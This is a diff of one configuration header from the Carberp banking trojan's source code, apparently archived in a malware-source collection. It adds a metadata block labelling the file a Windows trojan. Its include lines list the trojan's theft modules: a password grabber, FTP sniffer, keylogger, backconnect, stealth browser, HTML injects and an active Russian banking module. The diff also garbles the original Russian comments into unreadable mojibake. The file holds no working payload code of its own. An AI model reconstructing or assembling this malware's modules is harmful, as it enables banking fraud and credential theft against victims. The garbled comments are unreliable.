@@ -1,12 +1,23 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 /*--------------------------------------------------------------------------*/
 //
-//  Модули сборки RU
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ RU
 //
 /*--------------------------------------------------------------------------*/
 
 
-//#include "InternetExplorer.h" // Обработка запросов InternetExplorer
+//#include "InternetExplorer.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetExplorer
 //#include "Firefox.h"/
 //#include "Opera.h"
 
@@ -14,19 +25,19 @@
 
 //#include "KeepAlive.h"
 
-//#include "BotConfig.h"     // Модуль включает HTML инжекты
-//#include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
+//#include "BotConfig.h"     // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//#include "BotCryptHTTP.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 
-//#include "Grabber.h" // Включение грабера паролей
-//#include "FtpSniffer.h" // Перехват фтп трафика
-//#include "coocksol.h" // Очистка куков ИЕ и ФФ
-//#include "BackConnect.h" // Модуль обратной связи
-//#include "StealthBrowser.h" // Скрытый браузер
-//#include "KeyLogger.h" // СЛогирование ввода с клавиатуры
+//#include "Grabber.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//#include "FtpSniffer.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//#include "coocksol.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅ
+//#include "BackConnect.h" // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//#include "StealthBrowser.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//#include "KeyLogger.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //#include "Hunter.h" 
 
-#include "RuBnk\RuBnk.h" //Включение рубанка
+#include "RuBnk\RuBnk.h" //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //#include "CyberPlatDLL.h"
 
 //#include "CertGrab.h"
